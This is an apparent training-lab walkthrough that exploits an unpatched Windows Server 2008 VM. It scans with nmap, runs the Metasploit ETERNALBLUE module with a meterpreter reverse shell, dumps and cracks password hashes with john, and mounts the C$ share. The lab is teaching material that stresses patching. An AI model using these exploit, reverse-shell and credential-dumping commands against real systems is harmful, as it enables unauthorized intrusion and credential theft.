# RSSC2018 Endpoint Attack Lab

## Prerequisites

In order to execute this lab, there are a few things you will need to get started.
1. Installation of Windows Server 2008 as an attack target, either running on a VM or a separate machine, with the following requirements:
   * Fresh, unpatched install
   * Firewall disabled
   * SMBv1 enabled (enabled by default, so if you have not specifically disabled it then you don't need to change anything here)
   * The Administrator password should be set to something simple to make the demonstration of password cracking easier. In our example, we'll use `Drowssap1` as our password.
2. Kali Linux installed to attack the target host from
3. Both machines should be connected to the same network
4. For this lab we're going to use the IP 192.168.100.10 for the Windows attack host and 192.168.100.11 for the Kali console. Replace these IPs in the instructions with your own if using different ones.

## Attack Execution

Here we will walk through the process of attacking and gaining access to the unpatched Windows Server 2008 instance.

1. On your Kali installation, open 2 terminals. For now, we will work in Terminal 1.
2. We need to discover the host and determine what services are available on the machine so we can begin looking for weaknesses. nmap is a tool that helps us do this.

```bash
nmap -T4 -sSVC 192.168.100.10 -p 80,443,445
```

   These parameters do the following:  

   * -T4 sets the timing template to aggressive to make the scan happen more quickly
   * -sSVC specifies that nmap should use the SYN scan technique, should probe open ports to determine information about the service that opened the port, and sets the scripts nmap should use to default
   * -p specifies which ports to scan once host discovery is complete. In this scenario, we'll be scanning the commonly used web ports 80 and 443, as well as the SMB share port 445.

   More information on the commands used, or other information about nmap can be found by running `man nmap`.  

   This should return information about the SMB service on 445, so now we've determined that SMB may be a good attack point.  

3. We can see from the output that nmap was able to determine from the SMB information that the operating system is Windows Server 2008. We know that this OS, if unpatched, can be vulnerable to the ETERNALBLUE exploit. We'll now run an nmap script to determine if this server is unpatched and vulnerable.

```bash
nmap -p 445 192.168.100.10 --script smb-vuln-ms17-010
```

   * This tells nmap to scan your host on port 445 using the script that determines if it is vulnerable to ETERNALBLUE. It should come back indicating that it is indeed vulnerable.

4. Now that we know the host is vulnerable to ETERNALBLUE, we can run an exploit on it. On Terminal 1, start the metasploit console, which we will use to execute the attack.

```bash
msfconsole
```

5. Once you are at the msfconsole command prompt, select the metasploit module for eternal blue (msfconsole supports tab-complete).

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

6. Review your options for this module.

```bash
show options
```

7. Notice that the RHOST option is required. This is the IP address of the host to be attacked.

```bash
set RHOST 192.168.100.10
```

8. Now we need to set the payload. You can use many kinds of payloads to gain shell access, but in this scenario we'll deploy a meterpreter reverse tcp shell that connects back to our local box. Meterpreter shell allows us to execute a variety of useful functions once we gain access to the target box.

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

9. Now run `show options` again, and notice that the LHOST option is now available and required. This needs to be set to the IP of your local box so the shell knows where to connect back to once it's running on the target host.

```bash
set LHOST 192.168.100.11
```

10. Run the exploit. If it goes well, you should see a WIN! message and have a new meterpreter shell prompt.

```bash
run
```

11. You should now have a meterpreter shell prompt on the target host. You can run `help` at any time to see the commands availalbe to you here. First we'll want to launch a cmd prompt and run some commands to verify you have system access to the correct host.

```bash
shell
whoami
hostname
exit
```

12. Back at the meterpreter shell, now we want to see if we can get a dump of the passwords and then try to crack them. To make this easier, we want to start a logging session so any dumped hashes are already saved for us in a text file. To do this, we need to run the `background` command to bring us back to the msfconsole prompt and start spooling. Run the following commands.

```bash
background
spool /tmp/console.log
```

13. This will start logging all of your commands and output to /tmp/console.log. Now we need to connect back to our meterpreter shell session. To view the list of sessions available, use the `sessions -l` command, followed by `sessions -i <id>` where `<id>` is the ID of the session listed from the output of the `sessions -l` command.

```bash
sessions -l
sessions -i 1
```

14. Back on the meterpreter shell, run `hashdump`. You should see a list of usernames and hashed passwords, which are automatically logged as output to /tmp/console.log. 

15. Background the session again, and turn off spooling so we don't keep outputting unnecessary logs to /tmp/console.log

```bash
background
spool off
```

## Password Cracking

1. Let's switch over to Terminal 2 at this time. Now that we have a copy of the hashed passwords, we want to see if we can crack them. You can view the contents of the log output by running `cat /tmp/console.log`. Notice that there's more information than just the hashed passwords in here from the other commands we've run from our session. To clean this up and get a file that just contains the password hashes, we can `grep` that information out to a new file.

```bash
grep ":::" /tmp/console.log | tee hashedpasswords.txt
```

   * The grep command searches for the string ":::" in the console.log file (which the lines with hashed passwords will have), prints it out to the console and pipes it to the `tee` command, which saves console output to the file `hashedpasswords.txt`.
   
2. Now we can run our password cracking tool to crack the password. There are many cracking tools available, but for this exercise we'll use `john`.

```bash
john --format=nt hashedpasswords.txt
```

   * For more information on the options that can be used with `john` for more complex cracking processes, you can run `john -h` to display the help text.

3. This should now show you that the Administrator password was successfully cracked to be `Drowssap1`. We can confirm that this is correct through a variety of methods, but for our purposes, we'll mount the protected c$ share on the attack box and write a file to it. First, let's list the shares available on the host by running the following command. When prompted, enter the `Drowssap1` password that we cracked earlier.

```bash
smbclient -L hostname -I 192.168.100.10 -U Administrator
```
   * You should see a list of available shares on the host. Let's mount the protected `C$` share by creating a mount point and then mounting the share.

```bash
mkdir -p /mnt/atk_share
mount -t cifs //192.168.100.10/C$ /mnt/atk_share -o username=Administrator,password=Drowssap1
```

   * `mkdir` command creates the full directory specified
   * `smbclient` command lists the shares available on the target host. This will prompt you for the Administrator password, which you should supply the cracked password
   * `mount` command mounts the Windows share to /mnt/atk_share with the username and password specified, and specifies the type as a CIFS share

4. Now we can change directory to the remote share and see if we can write a file on the C:\ directory of the remote host.

```bash
cd /mnt/atk_share
echo "you done been" > pwnd.txt
```

   * This changes directory to the atk_share directory and writes a file to the share called `pwnd.txt` with the contents `you done been`.
   * To confirm, you can run `ls` to see the pwnd.txt file, and if you run `cat pwnd.txt` you should see your contents.
   * You can also log into your Windows host directly and confirm there is a file at C:\pwnd.txt with those contents.
   
## Cleanup

1. Now that we're finished with our exercise, we need to close the existing session on the target. Back on Terminal 1, instruct metasploit to terminate the existing session.

```bash
sessions -K
```

2. You can now exit metasploit by running `exit`.
3. On Terminal 2, you can unmount the Windows share by running `umount /mnt/atk_share`.

# Conclusion

We hope this has been useful in seeing the process of a basic attack on an unpatched Windows host, which should demonstrate how important patching and hardening procedures are to protecting against such easy attack vectors that can be very damaging to your environment.
